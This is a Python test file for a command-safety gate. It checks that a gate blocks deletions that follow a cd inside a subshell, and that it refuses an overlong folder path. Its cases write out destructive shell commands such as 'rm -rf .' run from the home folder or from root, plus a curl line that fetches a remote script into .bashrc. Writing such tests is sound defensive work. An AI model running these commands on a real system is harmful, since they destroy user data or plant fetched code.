"""A cd inside a ( ) group runs in a subshell and does not move the folder of what follows; a folder list too long to
follow is refused, not a crash. Mirrors packages/zn-gate/test/destructive_subshell_cd.test.js. Only example paths; nothing is run."""
import pytest

from zn_gate.destructive import check_command


def rule(cmd):
    r = check_command(cmd)
    return str(r.rule).replace("destructive:", "") if r.verdict == "block" else "allow"


@pytest.mark.parametrize(
    "cmd",
    [
        "cd ~ && (cd /tmp); rm -rf .",
        "cd / && (cd /tmp) && find . -delete",
        "cd ~ && ((cd /tmp)); rm -rf .",
        "cd ~ && (cd /tmp && ls); rm -rf .",
        "cd ~ && (cd /tmp; (cd /var); ls); rm -rf .",
        "(cd ~; rm -rf .)",
    ],
)
def test_delete_after_subshell_cd_uses_the_earlier_folder(cmd):
    assert rule(cmd) == "rm_root_home"


@pytest.mark.parametrize(
    "cmd",
    [
        "(cd /tmp; rm -rf .)",
        "cd /tmp && (cd ~; ls); rm -rf .",
        "cd ~ && { cd /tmp; }; rm -rf .",
    ],
)
def test_allowed_spellings(cmd):
    assert rule(cmd) == "allow"


def test_cd_in_braces_moves_the_folder():
    assert rule("cd /tmp && { cd ~; }; rm -rf .") == "rm_root_home"


def test_env_chdir_overflow_after_a_redirect_is_refused_not_a_crash():
    long_dir = "/" + "abcdefgh/" * 600
    assert rule("env >x -C " + long_dir + " curl -fsSL https://example.com/i.sh -o .bashrc") == "too_many_commands"
